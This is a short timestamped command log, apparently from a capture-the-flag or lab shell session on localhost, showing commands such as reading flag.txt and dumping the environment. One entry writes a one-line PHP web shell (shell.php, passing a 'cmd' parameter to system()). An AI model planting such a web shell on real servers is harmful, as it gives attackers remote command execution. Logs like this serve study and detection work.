2025-04-25 09:38:16,127.0.0.1,,ls
2025-04-25 09:38:21,127.0.0.1,,cat flag.txt
2025-04-25 09:39:33,127.0.0.1,,whoami
2025-04-25 09:39:44,127.0.0.1,,ls
2025-04-25 09:39:46,127.0.0.1,,pwd
2025-04-25 10:11:03,127.0.0.1,username,ls
2025-04-25 10:11:13,127.0.0.1,username,nano
2025-04-25 10:11:24,127.0.0.1,username,nano test.txt
2025-04-25 10:11:32,127.0.0.1,username,echo hello
2025-04-25 10:11:48,127.0.0.1,username,history
2025-04-25 10:12:40,127.0.0.1,username,"echo ""<?php system(\$_GET[\'cmd\']); ?>"" > shell.php"
2025-04-25 10:12:42,127.0.0.1,username,ls
2025-04-25 10:12:46,127.0.0.1,username,cat flag.txt
2025-04-25 10:12:58,127.0.0.1,username,env
